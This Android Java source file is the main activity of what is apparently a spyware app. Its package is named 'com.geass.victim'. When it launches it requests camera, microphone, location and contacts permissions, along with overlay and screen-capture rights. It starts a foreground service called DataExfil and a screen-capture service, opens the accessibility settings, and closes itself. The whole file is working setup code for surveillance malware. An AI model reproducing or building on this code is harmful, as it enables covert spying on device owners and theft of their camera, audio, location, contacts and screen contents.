package com.geass.victim;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.Manifest;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final int REQUEST_CODE_SCREEN_CAPTURE = 1;
    private static final int REQUEST_CODE_OVERLAY = 2;
    private static final int REQUEST_CODE_PERMISSIONS = 3;

    private String[] requiredPermissions = {
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.POST_NOTIFICATIONS
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Request runtime permissions
        requestPermissionsIfNeeded();

        // Request overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_CODE_OVERLAY);
            }
        }

        // Request screen capture permission
        MediaProjectionManager projectionManager = (MediaProjectionManager)
                getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        Intent captureIntent = projectionManager.createScreenCaptureIntent();
        startActivityForResult(captureIntent, REQUEST_CODE_SCREEN_CAPTURE);

        // Start foreground service
        Intent serviceIntent = new Intent(this, DataExfil.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // Open accessibility settings
        Intent accessibilityIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivity(accessibilityIntent);

        finish();
    }

    private void requestPermissionsIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            java.util.ArrayList<String> needPermissions = new java.util.ArrayList<>();
            for (String perm : requiredPermissions) {
                if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
                    needPermissions.add(perm);
                }
            }
            if (!needPermissions.isEmpty()) {
                requestPermissions(needPermissions.toArray(new String[0]), REQUEST_CODE_PERMISSIONS);
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE && resultCode == RESULT_OK && data != null) {
            Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
            serviceIntent.putExtra("resultCode", resultCode);
            serviceIntent.putExtra("data", data);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, "Permission denied: " + permissions[i], Toast.LENGTH_LONG).show();
                }
            }
        }
    }
}